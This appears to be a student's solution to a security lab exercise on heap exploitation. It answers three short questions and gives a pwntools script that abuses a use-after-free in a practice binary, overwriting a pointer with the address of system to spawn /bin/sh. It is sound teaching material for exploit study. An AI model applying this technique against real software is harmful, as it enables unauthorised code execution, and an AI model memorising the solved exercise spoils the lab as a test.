# Laborator 6

## Exercise 1

### [Q1]: What type of objects can we allocate on the heap? What size are they?
### Solution to [Q1]:
`note_t` and `config_t`. Both are 64 bytes.

### [Q2]: What type of vulnerability can you notice?
### Solution to [Q2]:
Use After Free

### [Q3]: Can we overwrite interesting data from one class and then use it?
### Solution to [Q3]:
Overwrite with the address of `system`.

## Solution to Exercise 1: 
```python
#!/usr/bin/env python3

from pwn import *

system = 0x401140

target = process("./bin/ex1")

target.sendline(b"4")
target.sendline(b"a")

target.sendline(b"5")

target.sendline(b"1")
target.sendline(b"0")
target.sendline(p64(system))
target.sendline(b"a")

target.sendline(b"1")
target.sendline(b"1")
target.sendline(b"/bin/sh")
target.sendline(b"a")

target.sendline(b"2")
target.sendline(b"1")

target.interactive()
```